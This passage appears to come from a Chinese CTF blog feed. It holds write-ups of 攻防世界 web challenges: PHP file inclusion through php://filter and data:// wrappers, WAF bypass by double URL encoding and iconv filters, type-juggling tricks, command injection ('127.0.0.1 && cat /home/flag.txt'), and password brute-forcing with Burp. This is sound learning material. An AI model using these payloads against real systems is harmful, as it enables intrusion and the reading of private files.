<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>看到php代码中的flag.php，我们直接在url后面加上，但是没有成功。<br>于是开始分析代码，可以看到要求以get方式传2个参数file1和file2。<br>file1的要求是非空，且被放入了include函数中。<br>file2放入了file_get_contents函数中，要求是全等于hello ctf<br>那么可以使用伪协议来读取flag.php源代码。</p>
</li>
<li><p>伪协议与解码<br>可使用的伪协议有很多种，这里仅演示我使用的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</span><br></pre></td></tr></table></figure>
<p>得到一串base64编码的数据，只需解码即可得到flag</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第一次做文件包含的题，仅仅是开始！</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_59057526/article/details/126747831">攻防世界-fileclude</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-file_include</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>明显是文件包含，get型传参</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure>
<p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p>
<h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符		第1次		第2次</span><br><span class="line">as 		%61%73		%2561%2573</span><br><span class="line">nc 		%63%6f		%2563%256f</span><br></pre></td></tr></table></figure>
<p>用第二次编码后的字符替换掉原来的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><strong>convert.iconv.* 绕过</strong><br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convert.iconv.*的使用有两种方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
<p>列举部分编码方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*	UCS-4BE	 UCS-4LE*  UCS-2  UCS-2BE  </span><br><span class="line">UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  </span><br><span class="line">UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  </span><br><span class="line">UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*</span><br><span class="line">eucJP-win*  SJIS-win*  ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure>
<p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure>


<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界-fileinclde</title>
    <url>/2022/11/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>换了种方式，就不会了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!?php</span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">	@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">	@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_get				获取一个配置选项的值</span><br><span class="line"></span><br><span class="line">ini_set 			为一个配置选项设置值</span><br><span class="line"></span><br><span class="line">display_errors 		错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。 </span><br><span class="line">display_errors = On</span><br><span class="line">开启状态下，若出现错误，则报错，出现错误提示</span><br><span class="line">dispaly_errors = Off </span><br><span class="line">关闭状态下，若出现错误，则提示：服务器错误。但是不会出现错误提示</span><br><span class="line"></span><br><span class="line">error_reporting 	设置应该报告何种 PHP 错误</span><br><span class="line">error_reporting(0);  // 关闭所有PHP错误报告</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // 报告 E_NOTICE也挺好 (报告未初始化的变量或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);  // 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL);  // 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);  // 报告所有 PHP 错误</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);  // 和 error_reporting(E_ALL); 一样</span><br><span class="line"></span><br><span class="line">$_COOKiE 			通过 HTTP Cookies 方式传递给当前脚本的变量的数组</span><br><span class="line"></span><br><span class="line">setcookie() 		setcookie() 定义了 Cookie，会和剩下的消息头一起发送给客户端。和其他消息头一样，必须在脚本产生任意输出之前发送 Cookie（由于协议的限制）。</span><br><span class="line"></span><br><span class="line">include 			include 表达式包含并运行指定文件</span><br><span class="line"></span><br><span class="line">file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>构造语句抓包<br>我们分析完源码后可知参数是从cookie传入的，于是可以使用抓包的方法修改cookie<br>接下来我们便是构造语句来获取flag，因为源码中文件名后面会接php，所以不需要在语句末尾中加.php<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:language=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>传参的方式不止一种，灵活处理。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_PHP2</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p>
</li>
<li><p>分析条件<br>我们看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
<p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p>
</li>
<li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_Web新手练习区</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_Web%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是攻防世界一些比较简单的题，算是用来补充知识的。</p>
<span id="more"></span>
<h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><p>直接按下F12，从Elements中找到flag</p>
<h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><p>首先根据要求在搜索框后加上： <code>/?a=1</code>  然后提交<br>之后根据要求，先抓包，然后将首部的GET请求改为POST请求<br>再在下面添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure>
<p>即可拿到flag</p>
<p>关于post的更多知识可以看：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">GET&amp;POST</a></p>
<h1 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h1><p>直接在url后面加上：<br><code>/robots.txt</code><br>然后把获得的php文件名加在url后面，即可拿到flag</p>
<h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>需要寻找index.php的备份文件，那么常见的备份文件后缀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar, tae.gz, zip, rar, bak, dat, txt, log, mdb, bz2, tar.bz2, 7z</span><br></pre></td></tr></table></figure>
<p>常见的网站源码备份文件名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web, website, backup, back, www, wwwroot, temp</span><br></pre></td></tr></table></figure>
<p>更详细的解释可以看看：<a href="https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/">备份文件</a><br>bak是自动创建的备份文件，因此首先尝试，出现下载框，下载后记事本方式打开，得到flag</p>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>明示了与cookie相关，所以我们直接查看cookie，发现指示我们打开cookie.php页面，打开后又发现页面写着看http response，所以我们抓包后，send to repeater，看响应，最终拿到flag</p>
<h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><p>不能按的按钮，那我们直接按下F12检查页面，发现在按钮处有个disabled。<br>这里浏览器之间有个有趣的小差别：<br>FireFox是直接删除disabled元素即可显示flag<br>chrome需要把disabled改为enabled才能显示flag</p>
<h1 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h1><p>打开后有一个输入密码的弹窗，没什么用。<br>按下F12查看元素，发现有一段script代码，我们仔细查看，发现一串可疑的16进制数据。<br>将16进制数据拿去转码为10进制，再通过python的一段代码编写（s数组内即为转码后的10进制数据）：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>成功得到flag。</p>
<h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h1><ul>
<li>xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。<br>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</li>
<li>referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</li>
</ul>
<p>题目明示伪造xff和referer，那么我们直接打开页面抓包，在包的首部添加字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:https://www.google.com</span><br><span class="line">X-Forwarded-for:123.123.123.123</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><p>这一关用到了弱口令爆破。<br>但其实之前我并没有学这个知识，所以一开始很迷惑，但还好，这部分知识并不复杂。<br>是一个登录界面，直接抓包。<br>抓包后发送到Intruder。看到Positions，我们会发现需要爆破的地方被用另一种颜色涂抹了，由于只需要爆破密码。所以把其它位置的$符号去掉，只保留密码处的，然后用户名是admin。<br>之后看到Payloads那里，我们需要一个字典来爆破，这样会比较高效。在Payload Options处导入我们准备好的字典后，直接开始攻击。<br>很快，我们发现payloads为123456处那里的字段长度与别的不同，我们检查这个包，发现response里面就有flag。</p>
<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><p>这一关打开是一个ping命令，然后结合题目信息，我们可以从远程命令执行入手（RCE）。<br>那么Windows远程命令常用的有 <code>&amp;  &amp;&amp;  |  ||</code><br>随便用那个都行，直接输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
<p>可以找到一个名为 <code>flag.txt</code>  的文件，于是我们可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; cat /home/flag.txt</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>本题的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题主要是考察对php的熟悉程度，虽然不难，但基础不好也容易掉入陷阱。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show_source 	show_source() 函数对文件进行语法高亮显示,是 highlight_file() 的别名</span><br><span class="line">include 		include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中</span><br></pre></td></tr></table></figure>
<p>代码搞清楚后，那么接下来看如何处理<br>要求是以get方式传入a,b参数，</p>
<ul>
<li>a的要求<br>值为0，且参数a本身不为flase<br>那么不能为数字0，因为会被解析为false<br>而我们知道字符型数据会被转化为0与数字比较，<br>因此随便填个字符即可满足要求</li>
<li>b的要求<br>不能为数字，且值要大于1234<br>那么直接来个2345a</li>
</ul>
<p>所以最终结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=a&amp;b=2345a</span><br></pre></td></tr></table></figure>
<p>即可拿到flag</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次总共11道题，每道题都非常简单，主要是考察基础知识，对于新手而言还是很有帮助的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>正是简单才看出基础。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_easyphp</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
<span id="more"></span>
<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<ol>
<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
</li>
<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
</li>
</ol>
<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
<ol start="3">
<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
